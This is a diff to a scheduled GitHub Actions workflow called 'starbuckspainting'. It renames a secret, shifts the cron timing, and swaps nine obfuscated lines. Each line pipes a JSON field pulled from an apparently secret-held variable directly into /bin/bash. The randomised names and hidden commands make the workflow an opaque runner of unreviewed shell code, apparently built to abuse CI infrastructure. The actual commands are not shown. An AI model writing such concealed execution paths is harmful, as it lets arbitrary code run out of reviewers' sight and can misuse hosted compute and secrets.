@@ -1,10 +1,8 @@
 name: starbuckspainting
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 3/6 * * *'
-
+    - cron: '58 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,15 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: starbuckspainting
         env:
-          wpwxh7225: ${{ secrets.wpwxh7225 }}
+          rlbo972: ${{ secrets.rlbo972 }}
         run: |
-          echo $wpwxh7225 | jq -r .oh72596 | /bin/bash
-          echo $mtbu30374 | jq -r .ipel00 | /bin/bash
-          echo $llwrk9030 | jq -r .miun6 | /bin/bash
-          echo $nrydd2554 | jq -r .h16 | /bin/bash
-          echo $idgdy43 | jq -r .iocge2 | /bin/bash
-          echo $c4766 | jq -r .p97342 | /bin/bash
-          echo $u5 | jq -r .t500 | /bin/bash
-          echo $h91878 | jq -r .zlmeh217 | /bin/bash
-          echo $ct39418 | jq -r .y097 | /bin/bash
+          echo $rlbo972 | jq -r .yo3 | /bin/bash
+          echo $ib65528 | jq -r .f883 | /bin/bash
+          echo $mmp416 | jq -r .dzw939 | /bin/bash
+          echo $bs21 | jq -r .ogba3010 | /bin/bash
+          echo $b2 | jq -r .ebkj1 | /bin/bash
+          echo $f37121 | jq -r .aewlb2982 | /bin/bash
+          echo $kkr249 | jq -r .bk4341 | /bin/bash
+          echo $qtcc150 | jq -r .njy0493 | /bin/bash
+          echo $hub574 | jq -r .qki79 | /bin/bash
 
